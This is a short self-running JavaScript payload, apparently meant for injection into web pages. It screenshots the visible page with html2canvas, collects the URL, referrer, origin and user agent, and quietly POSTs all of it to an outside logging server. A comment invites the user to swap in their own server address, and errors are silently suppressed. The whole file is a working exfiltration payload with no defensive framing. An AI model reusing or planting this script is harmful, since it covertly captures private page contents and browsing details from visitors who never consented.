(function(){
  function runPayload(){
    try {
      html2canvas(document.body).then(function(canvas){
        var screenshot = canvas.toDataURL('image/png');
        var payload = {
          screenshot: screenshot,
          userAgent: navigator.userAgent,
          url: window.location.href,
          time: new Date().toISOString(),
          referrer: document.referrer,
          origin: window.location.origin
        };
        fetch('https://anonys.onrender.com/log', {   // <-- Change this to your Render URL!
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload),
          keepalive: true
        });
      });
    } catch(e){}
  }

  if(typeof html2canvas === 'undefined'){
    var script = document.createElement('script');
    script.src = '/html2canvas.min.js';
    script.onload = runPayload;
    document.head.appendChild(script);
  } else {
    runPayload();
  }
})();
